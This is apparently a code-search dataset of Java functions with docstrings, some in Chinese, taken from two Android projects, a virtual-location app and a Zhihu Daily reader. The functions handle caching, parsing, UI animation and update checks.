{"docstring": "/**\n * \u53ea\u904d\u5386\u7b2c\u4e8c\u5c42\n * @param context\n * @param rootFile\n * @return\n */\n", "func_signal": "private List<AppInfo> findAndParseAPKs(Context context, File rootFile)", "code": "{\n    List<AppInfo> infoList = new ArrayList<>();\n\n    if(rootFile.isDirectory()){\n        File[] dirFiles = rootFile.listFiles();\n        if (dirFiles == null)\n            return infoList;\n\n        for (File f : dirFiles) {\n            addAppInfo(context,f,infoList);\n        }\n    }else{\n        addAppInfo(context,rootFile,infoList);\n    }\n\n    return infoList;\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\ui\\presenter\\AppListPresenter.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u6839\u636eResponse\uff0c\u5224\u65adToken\u662f\u5426\u5931\u6548\n *\n * @param response\n * @return\n */\n", "func_signal": "private boolean isTokenExpired(Response response)", "code": "{\n    if (response.code() == 401) {\n        return true;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\data\\net\\RetrofitHelper.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Returns an array of user ids. This array is cached here for quick access, so do not modify or\n * cache it elsewhere.\n *\n * @return the array of user ids.\n */\n", "func_signal": "public int[] getUserIds()", "code": "{\n    synchronized (mPackagesLock) {\n        return mUserIds;\n    }\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Asks the user to add an account of a specified type.  The authenticator\n * for this account type processes this request with the appropriate user\n * interface.  If the user does elect to create a new account, the account\n * name is returned.\n * <p>\n * <p>This method may be called from any thread, but the returned\n * {@link AccountManagerFuture} must not be used on the main thread.\n * <p>\n */\n", "func_signal": "public AccountManagerFuture<Bundle> addAccount(final int userId, final String accountType,\n                                               final String authTokenType, final String[] requiredFeatures,\n                                               final Bundle addAccountOptions,\n                                               final Activity activity, AccountManagerCallback<Bundle> callback, Handler handler)", "code": "{\n    if (accountType == null) throw new IllegalArgumentException(\"accountType is null\");\n    final Bundle optionsIn = new Bundle();\n    if (addAccountOptions != null) {\n        optionsIn.putAll(addAccountOptions);\n    }\n    optionsIn.putString(KEY_ANDROID_PACKAGE_NAME, \"android\");\n\n    return new AmsTask(activity, handler, callback) {\n        @Override\n        public void doWork() throws RemoteException {\n            addAccount(userId, mResponse, accountType, authTokenType,\n                    requiredFeatures, activity != null, optionsIn);\n        }\n    }.start();\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\client\\ipc\\VAccountManager.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/*\n * Writes the user list file in this format:\n *\n * <users nextSerialNumber=\"3\">\n *   <user id=\"0\"></user>\n *   <user id=\"2\"></user>\n * </users>\n */\n", "func_signal": "private void writeUserListLocked()", "code": "{\n    FileOutputStream fos = null;\n    AtomicFile userListFile = new AtomicFile(mUserListFile);\n    try {\n        fos = userListFile.startWrite();\n        final BufferedOutputStream bos = new BufferedOutputStream(fos);\n\n        // XmlSerializer serializer = XmlUtils.serializerInstance();\n        final XmlSerializer serializer = new FastXmlSerializer();\n        serializer.setOutput(bos, \"utf-8\");\n        serializer.startDocument(null, true);\n        serializer.setFeature(\"http://xmlpull.org/v1/doc/features.html#indent-output\", true);\n\n        serializer.startTag(null, TAG_USERS);\n        serializer.attribute(null, ATTR_NEXT_SERIAL_NO, Integer.toString(mNextSerialNumber));\n        serializer.attribute(null, ATTR_USER_VERSION, Integer.toString(mUserVersion));\n\n        for (int i = 0; i < mUsers.size(); i++) {\n            VUserInfo user = mUsers.valueAt(i);\n            serializer.startTag(null, TAG_USER);\n            serializer.attribute(null, ATTR_ID, Integer.toString(user.id));\n            serializer.endTag(null, TAG_USER);\n        }\n\n        serializer.endTag(null, TAG_USERS);\n\n        serializer.endDocument();\n        userListFile.finishWrite(fos);\n    } catch (Exception e) {\n        userListFile.failWrite(fos);\n        VLog.e(LOG_TAG, \"Error writing user list\");\n    }\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u767e\u5ea6\u8f6c\u56fd\u6d4b\u5c40\n *\n * @param point\n * @return\n */\n", "func_signal": "public static LatLngPoint bd2gcj(LatLngPoint point)", "code": "{\n    double bdLon = point.getLng();\n    double bdLat = point.getLat();\n    double x = bdLon - 0.0065;\n    double y = bdLat - 0.006;\n    double z = Math.sqrt(x * x + y * y) - 0.00002 * Math.sin(y * x_pi);\n    double theta = Math.atan2(y, x) - 0.000003 * Math.cos(x * x_pi);\n    double gcjLon = z * Math.cos(theta);\n    double gcjLat = z * Math.sin(theta);\n    return new LatLngPoint(gcjLat, gcjLon);//{'lat' : gcjLat, 'lon' : gcjLon};  \n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\utils\\MapUtils.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Check if we've hit the limit of how many users can be created.\n */\n", "func_signal": "private boolean isUserLimitReachedLocked()", "code": "{\n    int nUsers = mUsers.size();\n    return nUsers >= VUserManager.getMaxSupportedUsers();\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u83b7\u53d6\u5728gson\u6a21\u5f0f\u4e0b\u7684New\u6570\u636e\n *\n * @param id \u83b7\u53d6gson\u6570\u636e\u7684\u552f\u4e00id\n */\n", "func_signal": "@Override\npublic void getGsonNews(int id)", "code": "{\n    if (getDailyGsonDB(id) == null) {\n        String url = ZhihuApi.getGsonNewsContent(id);\n        AsyncHttpClient client = new AsyncHttpClient();\n        client.get(url, mGsonNewsResponseHandler);\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u901a\u8fc7\u6dfb\u52a0style\u5143\u7d20\u6765\u8fbe\u5230\u201c\u591c\u95f4\u6a21\u5f0f\u201d\u6548\u679c\n *\n * @param document \u8981\u4fee\u6539\u7684Document\u5bf9\u8c61\n */\n", "func_signal": "private void darkHtml(Document document)", "code": "{\n    String deepDarkFantasy = \"\";\n    String dark = \"#403f4d\";\n    deepDarkFantasy = \"<style>\\n\" +\n            \"        body{\\n\" +\n            \"            background-color:\" + dark + \" ;\\n\" +\n            \"        }\\n\" +\n            \"        .main-wrap{\\n\" +\n            \"            background-color:\" + dark + \";\\n\" +\n            \"        }\\n\" +\n            \"        .question-title{\\n\" +\n            \"            background-color:\" + dark + \";\\n\" +\n            \"            color: #999;\\n\" +\n            \"        }\\n\" +\n            \"        .meta .author{\\n\" +\n            \"            background-color:\" + dark + \";\\n\" +\n            \"            color: #999;\\n\" +\n            \"        }\\n\" +\n            \"        .content{\\n\" +\n            \"            background-color:\" + dark + \";\\n\" +\n            \"            color: #999;\\n\" +\n            \"        }\\n\" +\n            \"         .question{\\n\" +\n            \"            background-color: \" + dark + \";\\n\" +\n            \"        }\\n\" +\n            \"        .footer{\\n\" +\n            \"            background-color: \" + dark + \";\\n\" +\n            \"        }\\n\" +\n            \".question + .question{\\n\" +\n            \"            border-top: 5px solid #999;\\n\" +\n            \"        }\\n\" +\n            \"    </style>\";\n    document.head().append(deepDarkFantasy);\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u4f7f\u7528SQL\u8bed\u53e5\u62fc\u63a5\u7684\u63d2\u5165\u8bed\u53e5(\u6027\u80fd\u66f4\u597d)\uff0c<b>\u5f85\u6d4b\u8bd5</b>\n *\n * @param dailyGson \u8981\u4fdd\u5b58\u7684gson\u6570\u636e\n */\n", "func_signal": "@Deprecated\nprivate void insertDailyGsonDB(DailyGson dailyGson)", "code": "{\n    SQLiteDatabase database = mSQLiteHelper.getWritableDatabase();\n    String sql = \"INSERT OR IGNORE INTO daily(id, title, image_source, image, share_url, ga_prefix, body) values(?,?,?,?,?,?,?)\";\n    database.execSQL(sql, new Object[]{dailyGson.id, dailyGson.title, dailyGson.image_source, dailyGson.image, dailyGson.share_url, dailyGson.ga_prefix, dailyGson.body});\n    database.close();\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u5e8f\u5217\u5316List\u4e3a\u672c\u5730\u6587\u4ef6\uff0c\u5df2\u8fc7\u65f6\u3002\u5df2\u4f7f\u7528\u6570\u636e\u5e93\u66ff\u4ee3\n *\n * @param date\n * @param dailyList\n * @throws IOException\n */\n", "func_signal": "@Deprecated\nprivate void serializDaily(int date, List<Daily> dailyList) throws IOException", "code": "{\n    String itemParentPath = App.getContext().getCacheDir().getAbsolutePath() + \"/daily\";\n    Log.i(\"itemPath\", itemParentPath);\n    File itemParent = new File(itemParentPath);\n    if (!itemParent.exists()) {\n        boolean createdDir = itemParent.mkdir();\n        Log.d(\"serilizDaily\", itemParent.getName() + (createdDir ? \"\u521b\u5efa\u6210\u529f\" : \"\u521b\u5efa\u5931\u8d25\"));\n    }\n    File item = new File(itemParentPath + \"/\" + date);\n    FileOutputStream fos = new FileOutputStream(item);\n    ObjectOutputStream oos = new ObjectOutputStream(fos);\n    oos.writeObject(dailyList);\n    oos.close();\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "// Same animation that FloatingActionButton.Behavior uses to hide the FAB when the AppBarLayout exits\n", "func_signal": "private void animateOut(final View button)", "code": "{\n    if (((FABProgressCircle) button).getVisibility() == View.VISIBLE) {\n        if (Build.VERSION.SDK_INT >= 14) {\n            ViewCompat.animate(button).scaleX(0.0F).scaleY(0.0F).alpha(0.0F).setInterpolator(INTERPOLATOR).withLayer()\n                    .setListener(new ViewPropertyAnimatorListener() {\n                        public void onAnimationStart(View view) {\n                            FABCircleProgressBehavior.this.mIsAnimatingOut = true;\n                        }\n\n                        public void onAnimationCancel(View view) {\n                            FABCircleProgressBehavior.this.mIsAnimatingOut = false;\n                        }\n\n                        public void onAnimationEnd(View view) {\n                            FABCircleProgressBehavior.this.mIsAnimatingOut = false;\n                            view.setVisibility(View.GONE);\n                        }\n                    }).start();\n        } else {\n            Animation anim = AnimationUtils.loadAnimation(button.getContext(), android.R.anim.fade_out);\n            anim.setInterpolator(INTERPOLATOR);\n            anim.setDuration(200L);\n            anim.setAnimationListener(new Animation.AnimationListener() {\n                public void onAnimationStart(Animation animation) {\n                    FABCircleProgressBehavior.this.mIsAnimatingOut = true;\n                }\n\n                public void onAnimationEnd(Animation animation) {\n                    FABCircleProgressBehavior.this.mIsAnimatingOut = false;\n                    button.setVisibility(View.GONE);\n                }\n\n                @Override\n                public void onAnimationRepeat(final Animation animation) {\n                }\n            });\n            button.startAnimation(anim);\n        }\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\view\\widget\\FABCircleProgressBehavior.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u6e05\u9664\u6307\u5b9a\u65e5\u671f\u524d\u7684\u6570\u636e\uff0c\u9ed8\u8ba4\u4e3a7\u5929\u4e4b\u524d\n *\n * @param before \u8d85\u8fc7\u6b64\u65e5\u524d\u7684\u6240\u6709\u6570\u636e\n * @return \u88ab\u5220\u9664\u7684\u6570\u636e\u6761\u6570\n */\n", "func_signal": "public int clearOutdatedDB(int before)", "code": "{\n    SQLiteDatabase database = mSQLiteHelper.getWritableDatabase();\n    Cursor findId = database.query(\"dailyresult\"\n            , new String[]{\"id\"}, \"date<=?\", new String[]{before + \"\"}, null, null, null);\n    List<String> toDelete = new ArrayList<>();\n    while (findId.moveToNext()) {\n        int id = findId.getInt(findId.getColumnIndex(\"id\"));\n        Log.d(TAG, \"IDtoDelete in Result--->\" + id);\n        toDelete.add(id + \"\");\n    }\n    if (findId.isAfterLast() && !findId.isClosed()) {\n        findId.close();\n    }\n    int hasDeleted = database.delete(\"dailyresult\", \"date<=?\", new String[]{before + \"\"});\n    for (String id : toDelete) {\n        hasDeleted += database.delete(\"daily\", \"id=?\", new String[]{id}); //\u4f7f\u7528delete()\u4e00\u6b21\u6027\u5220\u9664\uff0c\u4f1a\u63d0\u793a\u53c2\u6570\u8fc7\u591a\n    }\n    Log.d(TAG, \"hasDeleted--->\" + hasDeleted);\n    return hasDeleted;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * Called when the Activity could not connect to Google Play services and the auto manager\n * could resolve the error automatically.\n * In this case the API is not available and notify the user.\n *\n * @param connectionResult can be inspected to determine the cause of the failure\n */\n", "func_signal": "@Override\npublic void onConnectionFailed(ConnectionResult connectionResult)", "code": "{\n\n    // TODO(Developer): Check error code and notify the user of error state and resolution.\n    ToastUtils.showShort(\"Could not connect to Google API Client: Error \" + connectionResult.getErrorCode());\n    GooglePlacesActivity.this.finish();\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\view\\ui\\activity\\GooglePlacesActivity.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u521b\u5efa\u4e00\u4e2aModel\u5bf9\u8c61\n *\n * @param iGsonCallBack \u7528\u6765\u5b9e\u73b0\u5b9e\u73b0GSON\u6570\u636e\u83b7\u53d6\u5b8c\u6210\u540e\u7684\u56de\u8c03\u63a5\u53e3\uff0c\u4e3b\u8981\u7528\u4e8eRecyclerView\u663e\u793a\n * @return \u8fd4\u56deModel\u5bf9\u8c61\n */\n", "func_signal": "public static DailyModel newInstance(IGsonCallBack iGsonCallBack)", "code": "{\n    if (mDailyModel == null) {\n        return new DailyModel(iGsonCallBack);\n    } else {\n        return mDailyModel;\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u4f7f\u7528SQL\u8bed\u53e5\u62fc\u63a5\u7684\u63d2\u5165\u8bed\u53e5(\u6027\u80fd\u66f4\u597d)\uff0c<b>\u5f85\u6d4b\u8bd5</b>\n *\n * @param dailyResult \u8981\u4fdd\u5b58\u7684DailyResult\u6570\u636e\n */\n", "func_signal": "@Deprecated\nprivate void insertDailyStoriesDB(DailyResult dailyResult)", "code": "{\n    SQLiteDatabase database = mSQLiteHelper.getWritableDatabase();\n    for (Daily story : dailyResult.stories) {\n        String sql = \"INSERT OR IGNORE INTO dailyresult(date, id, title, image, type, ga_prefix) values(?,?,?,?,?,?)\";\n        database.execSQL(sql, new Object[]{dailyResult.date, story.id, story.title, story.image, story.type, story.ga_prefix});\n    }\n    database.close();\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "// Same animation that FloatingActionButton.Behavior uses to show the FAB when the AppBarLayout enters\n", "func_signal": "@TargetApi(Build.VERSION_CODES.KITKAT)\nprivate void animateIn(View button)", "code": "{\n    if (((FABProgressCircle) button).getVisibility() == View.INVISIBLE) {\n        if (Build.VERSION.SDK_INT >= 14) {\n            ViewCompat.animate(button).scaleX(1.0F).scaleY(1.0F).alpha(1.0F)\n                    .setInterpolator(INTERPOLATOR).withLayer().setListener(null)\n                    .start();\n        } else {\n            Animation anim = AnimationUtils.loadAnimation(button.getContext(), android.R.anim.fade_in);\n            anim.setDuration(200L);\n            anim.setInterpolator(INTERPOLATOR);\n            button.startAnimation(anim);\n        }\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\view\\widget\\FABCircleProgressBehavior.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u4f7f\u7528Jsoup\u6765\u5bf9\u6570\u636e\u5e93\u91cc\u9762\u7684DaliyGson\u4e2d\u7684body\u5b57\u6bb5\u8fdb\u884c\u89e3\u6790\n *\n * @param dailyGson \u5f85\u89e3\u6790\u7684gson\u5bf9\u8c61\n * @return \u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u989d\u5916\u4fe1\u606f\u548c\u6b63\u6587\u7684HashMap\n */\n", "func_signal": "public Map<String, LinkedHashMap<String, String>> parseBody(DailyGson dailyGson)", "code": "{\n    long before = System.currentTimeMillis();\n    String xml = dailyGson.body;\n    Map<String, LinkedHashMap<String, String>> soup = new HashMap<String, LinkedHashMap<String, String>>();\n    LinkedHashMap<String, String> extra = new LinkedHashMap<String, String>();\n    LinkedHashMap<String, String> article = new LinkedHashMap<String, String>();\n    Document document = Jsoup.parse(xml, \"\", new Parser(new XmlTreeBuilder()));\n    Elements all = document.getAllElements();\n    for (Element content : all) {\n        if (content.hasClass(\"avatar\")) {\n            String src = content.attr(\"src\");\n            extra.put(\"avatar\", src);\n            Log.i(\"parsing\", \"avatar--->\" + src);\n        } else if (content.hasClass(\"author\")) {\n            extra.put(\"author\", content.text());\n            Log.i(\"parsing\", \"author--->\" + content.text());\n        } else if (content.hasClass(\"bio\")) {\n            extra.put(\"bio\", content.text());\n            Log.i(\"parsing\", \"bio--->\" + content.text());\n        } else if (content.hasClass(\"content\")) {\n            extra.put(\"allcontent\", content.html());\n            for (Element item : content.children()) {\n                if (!hasImgNode(item) && item.text().length() > 20) {\n                    String outerHtml = item.outerHtml().replaceAll(\"&nbsp;\", \" \");\n                    article.put(outerHtml, \"p\");\n                } else if (hasImgNode(item)) {\n                    Element image = item.child(0);\n                    String src = image.attr(\"src\");\n                    article.put(src, \"img\");\n                } else if (item.hasText() && item.text().length() <= 5 && !hasImgNode(item)) {\n                    // <p> \u6807\u7b7e\u5185\u5bb9\u4e3a\u6570\u5b57\uff0c\u6216\u8005\u5176\u4ed6\u7b80\u5355\u7684\u4e1c\u897f\uff0c\u4f20\u7ed9TextView\u663e\u793a\u7684\u65f6\u5019\u4e0d\u5e26\u6807\u7b7e\uff0c\u6b63\u5e38\u52a0\u7c97\u663e\u793a\n                    article.put(item.text(), \"simpleBoldP\");\n                } else if (item.hasText() && item.text().length() > 5 && item.text().length() <= 20 && !hasImgNode(item)) {\n                    article.put(item.text(), \"simpleP\");\n                }\n            }\n        }\n    }\n    soup.put(\"extra\", extra);\n    soup.put(\"article\", article);\n    long after = System.currentTimeMillis();\n    Log.d(TAG, \"Parse XML used time--->\" + (after - before));\n    return soup;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u53ea\u66b4\u9732\u4e86\u6b64\u65b9\u6cd5\u7ed9Presenter\u4f7f\u7528\uff0c\u6839\u636ePref\u6765\u5224\u65ad\u6570\u636e\u83b7\u53d6\u7684\u65b9\u5f0f\u4ee5\u53ca\u987a\u5e8f\n * \u83b7\u53d6\u7684\u6570\u636e\u4f9bRecyclerView\u6765\u663e\u793a\n *\n * @param date \u5f53\u524d\u7684\u65f6\u95f4 <b>+1\u5929</b>\n */\n", "func_signal": "public void getDailyResult(int date)", "code": "{\n    hasReadFromNet = false;\n    if (PrefUtils.isEnableCache()) {\n        getFromCache(date);\n    } else {\n        getFromNet(date);\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u8bc6\u522b\u670d\u52a1\u5668\u4e0a\u7684xml\u6587\u4ef6\u6765\u786e\u8ba4\u662f\u5426\u6709\u65b0\u7248\n * \u76f8\u5e94\u7684\u65b0\u7248url\u5199\u5728xml\u91cc\u7684<url>\u6807\u7b7e\n * \u901a\u8fc7\u66ff\u6362\u81ea\u5df1\u7684xml\u6587\u4ef6\u6765\u8fbe\u5230\u66ff\u6362\u76f8\u5e94\u7684\u66f4\u65b0\u6e90\n */\n", "func_signal": "public void checkUpdate()", "code": "{\n    if (PrefUtils.isAutoUpdate()) {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                String urlStr = \"https://raw.githubusercontent.com/troyliu0105/BuildingBlocks/dev/app/bbupdate.xml\";\n                int versionCode = 0;\n                String versionName = null;\n                String apkUrl = null;\n                List<String> desc = new ArrayList<>();\n                try {\n                    URL url = new URL(urlStr);\n                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                    connection.setConnectTimeout(3000);\n                    connection.setReadTimeout(3000);\n                    connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\");\n                    connection.setRequestProperty(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\");\n                    connection.setRequestProperty(\"Upgrade-Insecure-Requests\", \"1\");\n                    connection.setRequestMethod(\"GET\");\n                    InputStream inputStream = connection.getInputStream();\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n                    File tmp = new File(App.getContext().getCacheDir(), \"update.xml\");\n                    if (tmp.exists()) {\n                        boolean hasDeleted = tmp.delete();\n                        Log.d(TAG, \"\u65e7\u7684update.xml\" + (hasDeleted ? \"\u5df2\u88ab\u5220\u9664\" : \"\u5220\u9664\u5931\u8d25\"));\n                    }\n                    FileWriter writer = new FileWriter(tmp);\n                    BufferedWriter bufferedWriter = new BufferedWriter(writer);\n                    char[] buffer = new char[1024];\n                    int hasRead;\n                    while ((hasRead = reader.read(buffer)) != -1) {\n                        bufferedWriter.write(buffer, 0, hasRead);\n                        bufferedWriter.newLine();\n                    }\n                    bufferedWriter.close();\n                    writer.close();\n                    inputStream.close();\n                    reader.close();\n                    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n                    DocumentBuilder builder = factory.newDocumentBuilder();\n                    Document document = builder.parse(tmp);\n                    Element bb = (Element) document.getElementsByTagName(\"update\").item(0);\n                    versionCode = Integer.parseInt(bb.getElementsByTagName(\"versionCode\").item(0).getFirstChild().getNodeValue());\n                    versionName = bb.getElementsByTagName(\"versionName\").item(0).getFirstChild().getNodeValue();\n                    apkUrl = bb.getElementsByTagName(\"url\").item(0).getFirstChild().getNodeValue();\n                    NodeList descNodes = bb.getElementsByTagName(\"description\");\n                    for (int i = 0; i < descNodes.getLength(); i++) {\n                        desc.add(descNodes.item(i).getFirstChild().getNodeValue());\n                    }\n                } catch (IOException | ParserConfigurationException | SAXException e) {\n                    e.printStackTrace();\n                }\n                if (versionCode > VersionUtils.getVerisonCode()) {\n                    mMainActivity.showUpdate(versionCode, versionName, apkUrl, desc);\n                }\n            }\n        }).start();\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\presenters\\MainActivityPresenter.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u521b\u5efa\u4e00\u4e2aModel\u5bf9\u8c61\n *\n * @param iHttpCallBack \u7528\u6765\u5b9e\u73b0\u5b9e\u73b0\u6570\u636e(\u975eGSON\u6570\u636e)\u5b8c\u6210\u540e\u7684\u56de\u8c03\u63a5\u53e3\uff0c\u4e3b\u8981\u7528\u4e8eRecyclerView\u663e\u793a\n * @return \u8fd4\u56deModel\u5bf9\u8c61\n */\n", "func_signal": "public static DailyModel newInstance(IHttpCallBack iHttpCallBack)", "code": "{\n    if (mDailyModel == null) {\n        return new DailyModel(iHttpCallBack);\n    } else {\n        return mDailyModel;\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * Returns the filter for the current set of autocomplete results.\n */\n", "func_signal": "@Override\npublic Filter getFilter()", "code": "{\n    Filter filter = new Filter() {\n        @Override\n        protected FilterResults performFiltering(CharSequence constraint) {\n            FilterResults results = new FilterResults();\n            // Skip the autocomplete query if no constraints are given.\n            if (constraint != null) {\n                // Query the autocomplete API for the (constraint) search string.\n                mResultList = getAutocomplete(constraint);\n                if (mResultList != null) {\n                    // The API successfully returned results.\n                    results.values = mResultList;\n                    results.count = mResultList.size();\n                }\n            }\n            return results;\n        }\n\n        @Override\n        protected void publishResults(CharSequence constraint, FilterResults results) {\n            if (results != null && results.count > 0) {\n                // The API returned at least one result, update the data.\n                notifyDataSetChanged();\n            } else {\n                // The API did not return any results, invalidate the data set.\n                notifyDataSetInvalidated();\n            }\n        }\n    };\n    return filter;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\view\\adapter\\GooglePlacesAdapter.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * Initializes with a resource for text rows and autocomplete query bounds.\n *\n * @see ArrayAdapter#ArrayAdapter(Context, int)\n */\n", "func_signal": "public GooglePlacesAdapter(Context context, int resource, GoogleApiClient googleApiClient,\n                           LatLngBounds bounds, AutocompleteFilter filter)", "code": "{\n    super(context, resource);\n    mGoogleApiClient = googleApiClient;\n    mBounds = bounds;\n    mPlaceFilter = filter;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\view\\adapter\\GooglePlacesAdapter.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u5220\u9664\u8fc7\u671f\u7684Glide\u7f13\u5b58\n *\n * @param before \u8fc7\u671f\u65f6\u95f4\n */\n", "func_signal": "public void clearOutdatedPhoto(final int before)", "code": "{\n    Thread thread = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            File cacheDir = Glide.getPhotoCacheDir(App.getContext());\n            File[] files = cacheDir.listFiles();\n            for (File child : files) {\n                if (Integer.parseInt(Constants.simpleDateFormat.format(child.lastModified())) <= before) {\n                    //noinspection ResultOfMethodCallIgnored\n                    child.delete();\n                }\n            }\n            WebActivityPresenter presenter = new WebActivityPresenter();\n            presenter.clearCacheFolder(before);\n        }\n    });\n    thread.start();\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u907f\u514d\u56e0\u4e3a\u8981\u79fb\u9664\u7684\u5143\u7d20\u4e0d\u5b58\u5728\uff0c\u800c\u9020\u6210\u7684IndexOutOfBoundsException\uff0c\u5148\u5bf9\u5143\u7d20\u8fdb\u884c\u5224\u65ad\n *\n * @param document \u4ece\u7f51\u9875\u89e3\u6790\u5f97\u5230\u7684Document\u5bf9\u8c61\n */\n", "func_signal": "private void removeElements(Document document)", "code": "{\n    Elements global_header = document.select(\"div[class=global-header]\");\n    if (global_header != null && global_header.size() != 0) {\n        global_header.remove();\n    }\n    Elements header_for_mobile = document.select(\"div[class=header-for-mobile]\");\n    if (header_for_mobile != null && header_for_mobile.size() != 0) {\n        header_for_mobile.remove();\n    }\n    Elements question = document.select(\"div[class=question]\");\n    if (question != null && question.size() == 2) {\n        question.get(1).remove();\n    }\n    Elements qr = document.select(\"div[class=qr]\").remove();\n    if (qr != null && qr.size() == 0) {\n        qr.remove();\n    }\n    Elements bottom_wrap = document.select(\"div[class=bottom-wrap]\");\n    if (bottom_wrap != null && bottom_wrap.size() != 0) {\n        bottom_wrap.remove();\n    }\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
